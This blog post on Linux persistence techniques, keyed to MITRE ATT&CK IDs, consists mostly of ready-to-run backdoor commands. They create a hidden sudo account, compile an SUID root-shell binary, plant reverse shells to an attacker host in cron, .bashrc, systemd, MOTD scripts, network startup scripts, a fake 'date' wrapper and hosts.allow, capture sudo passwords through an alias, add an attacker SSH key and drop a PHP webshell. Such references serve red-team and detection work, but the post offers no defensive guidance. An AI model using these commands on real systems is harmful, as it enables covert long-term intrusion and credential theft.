---
layout: single
title: "Common Linux Persistence Techniques"
excerpt: "The adversary is attempting to keep their foothold.
Persistence refers to strategies used by adversaries to maintain access to systems despite restarts, changing credentials, and other disruptions that may terminate their access. "
date: 2021-05-10 00:22:00 -0000
classes: wide
header:
  teaser: 
  teaser_home_page: true
  icon: 
categories: linux
permalink: /linux/persistence
tags: [linux, persistence]

---


This post will cover a few common linux persistence techniques used by adversary to establish permanent access. This blog assumed that you have basic knowledge of linux OS such as linux service, user privilege, crontab, remote management etc. The adversary is attempting to keep their foothold.
Persistence refers to strategies used by adversaries to maintain access to systems despite restarts, changing credentials, and other disruptions that may terminate their access. 

---
## Creating privilege account

[MITRE ID: T1136.001](https://attack.mitre.org/techniques/T1136/001/)

The adversary tends to create a high privilege account to maintain access on the compromised system. They usually create a user with a sudo privilege across the system.

	$ Command: 
	
	victim@server$ sudo useradd -m -s /bin/bash nginx
	victim@server$ sudo usermod -aG sudo nginx
	victim@server$ sudo passwd nginx
	

    
## Creating SUID Binary

[MITRE ID: T1548.001](https://attack.mitre.org/techniques/T1548/001/)

A binary with its SUID bit set, implying that everything run by the programs will be done with that user's privileges. If the SUID binary is set with root privilege, anyone that run the binary will have access on the system with the root privilege. Below is an example of creating a SUID binary named suid00r.

	$ Command:
	
	root@victim$ tempdir="/var/tmp"
	
	root@victim$ echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $tempdir/suid00r.c
	root@victim$ gcc $tempdir/suid00r.c -o $tempdir/suid00r 2>/dev/null
	root@victim$ rm $tempdir/suid00r.c
	root@victim$ chown root:root $tempdir/suid00r
	root@victim$ chmod 4777 $tempdir/suid00r

## Creating cron job

[MITRE ID: T1053.003](https://attack.mitre.org/techniques/T1053/003/)

The crontab file contains a list of tasks that you wish to execute on a regular basis, as well as the name of the command that manages them. Crontab stands for "cron table," as it executes tasks using the cron job scheduler. 

Adversary can create a reverse shell that pointing to their C2 server using cron job upon reboot. Below is a simple example of bash reverse shell as for the PoC.

	$ Command:
	
	root@victim$ echo "@reboot sleep 120 && /bin/bash -l > /dev/tcp/$ATTACKERIP/4444 0<&1 2>&1"

## Creating .bashrc backdoor

[MITRE ID: T1546.004](https://attack.mitre.org/techniques/T1546/004/)

A bashrc file is a shell script file that Linux uses when starting up to load items like modules and aliases into user's profile. So, whenever an interactive session is launched, the .bashrc file will load the reverse shell pointing to the adversary C2 server.

	$ Command:
	
	victim@server$ echo "(setsid bash 1>&/dev/tcp/$ATTACKERIP/5555 0>&1 & ) 2>/dev/null" >> ~/.bashrc

## Creating .bashrc alias

[MITRE ID: T1546.004](https://attack.mitre.org/techniques/T1546/004/)

Same as .bashrc backdoor but it leverage linux alias. When we often need to use a single large command several times, we construct an alias for it.
Alias is a shortcut command that performs the same functions as if we typed the entire command. 

As for the PoC, we use `sudo` alias. Whenever the user type sudo command for example "`sudo netstat -plnt`", the sudo alias will load then asking for user's password and dump the plaintext password to the /tmp/dumper directory before the real sudo operation from `/usr/bin/sudo` spawn.

	$ Command:
	
	victim@server$ echo "alias sudo='echo -n "[sudo] password for "\$USER": " && read -r password && echo ""\$password"" >/tmp/dumper && /usr/bin/sudo \$@'" >> ~/.bashrc

## Creating systemd backdoor 

[MITRE ID: T1543.002](https://attack.mitre.org/techniques/T1543/002/)

For Linux operating systems, Systemd is a system and service manager. It includes capabilities such as parallel launch of system services at boot time, on-demand activation of daemons, and dependency-based service control logic, and is meant to be backwards compatible with SysV init scripts.

As for the PoC, we create `backdoorx` service in /etc/systemd/system/ directory. Whenever the system start and the network is ready, it will established a reverse shell to adversary C2.

	$ Command:
	
	root@victim$ SYSTEMD_NAME='backdoorx'
	
	root@victim$ cat << EOF > /etc/systemd/system/$SYSTEMD_NAME.service
	[Unit]
	After=network-online.target
	[Service]
	Type=simple
	ExecStart=/bin/bash -c "bash -i >& /dev/tcp/$ATTACKERIP/6666 0>&1"
	[Install]
	WantedBy=multi-user.target'
	EOF
	
	root@victim$ systemctl daemon-reload
	root@victim$ systemctl start $SYSTEMD_NAME.service
	root@victim$ systemctl enable $SYSTEMD_NAME.service

## Creating SSH authorized_keys

[MITRE ID: T1098.004](https://attack.mitre.org/techniques/T1098/004/)

In SSH, the authorized keys file defines the SSH keys that can be used to login into the user account for whom the file is set up. It's a crucial configuration file since it sets up persistent access through SSH keys.

As for the PoC, we used adversary SSH Public Key that is placed on the server you intend to log in to.

	$ Command:
	
	victim@server$ echo 'ssh-rsa AAAAB3Nza7Y-SNIP-6v6tgj6V5Dt root@C2box' >> ~/.ssh/authorized_keys
	attacker@C2$ ssh victim@server

## Creating SSH MOTD banner

When you use SSH to log into a machine, a banner called Motd (Message of the Day) shows. Motd scripts for Ubuntu/Debian may be found in /etc/update-motd.d/. 

As for the PoC, we created a MOTD banner named 20-motd-bas that will make a reverse shell to adversary C2 server whenever any user login via SSH.

	$ Command:
	
	root@victim$ MOTDNAME='20-motd-bas'
	root@victim$ cat << EOF > /etc/update-motd.d/$MOTDNAME
	#!/bin/sh
	# Creating SSH motd banner
	/bin/bash -c "bash -i >& /dev/tcp/$ATTACKERIP/7777 0>&1" &
	EOF
	root@victim$ chmod +x /etc/update-motd.d/$MOTDNAME

How does it work? At each login, pam motd(8) as the root user invokes executable scripts in /etc/update-motd.d/*, and this information is concatenated in /var/run/motd. The run-parts(8) –lsbsysinit option controls the order in which scripts are executed (essentially alphabetical order, with a few exceptions). 

## Creating Webshell as backdoor

[MITRE ID: T1505.003](https://attack.mitre.org/techniques/T1505/003/)

Adversary commonly placed a webshell for later access. A simple PoC as shown below.

	$ Command:
	victim@server$ WEBSHELL='bdoor.php'
	victim@server$ PATH2WEBSHELL=/var/www/html/secretfolder/$WEBSHELL

	victim@server$ cat << EOF > $PATH2WEBSHELL
	# Creating webshell 
	<?php
	    if (isset($_REQUEST['cmd'])) {
	        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
	    }
	?>
	EOF

## Creating Network startup as backdoor

There are four directories in which scripts can be placed which will always be run for any interface during certain phases of ifup and ifdown commands. One of them is `/etc/network/if-up.d/`. Scripts in this directory are run after bringing the interface up.

	$ Command:
	
	root@victim$ STARTUPNAME='upsdoor'
	root@victim$ PATH2STARTUPNAME=/etc/network/if-up.d/$STARTUPNAME

	root@victim$ cat << EOF > $PATH2STARTUPNAME
	#!/bin/sh
	# Creating startup service 
	bash -i >& /dev/tcp/$ATTACKERIP/8888 0>&1 & 2>/dev/null
	EOF

	root@victim$ chmod +x $PATH2STARTUPNAME

## Creating binary wrapper

[MITRE ID: T1574.008](https://attack.mitre.org/techniques/T1574/008/)

Adversary may created a wrapper from a legitimate binary as simple as shown below. Whenever, any user type command `date`, a reverse shell is spawned to the C2.

	$ Command:
	
	root@victim$ touch /usr/local/bin/date
	root@victim$ cat << EOF > /usr/local/bin/date
	#!/bin/bash
	# Creating binary wrapper
	bash -i >& /dev/tcp/$ATTACKERIP/9999 0>&1 & 2>/dev/null
	/bin/date $@
	EOF
	root@victim$ chmod +x /usr/local/bin/date

## Creating TCP wrapper

Basic traffic filtering of incoming network traffic is provided by TCP wrappers. Other systems can be granted or refused access to "wrapped" network services running on a Linux server.

TCP wrappers rely on two configuration files as the basis for access control:

-   ***/etc/hosts.allow***
-   ***/etc/hosts.deny***

These files are used to determine whether or not a client may connect to a network service on a remote host. 
As for PoC, if someone connect to any port on target machine such as SSH, reverse shell will be spawned to adversary server.

	$ Command:

	root@victim$ echo -e "Creating TCP wrapper\nALL: ALL: spawn (bash -c '/bin/bash -i >& /dev/tcp/$ATTACKERIP/4545 0>&1') & :allow" >> /etc/hosts.allow



## Reference
- https://manpages.debian.org/testing/ifupdown/interfaces.5.en.html
- https://www.thegeekdiary.com/understanding-tcp-wrappers-in-linux/
- https://attack.mitre.org/techniques/T1574/008/
- https://attack.mitre.org/techniques/T1505/003/
- https://attack.mitre.org/techniques/T1543/002/
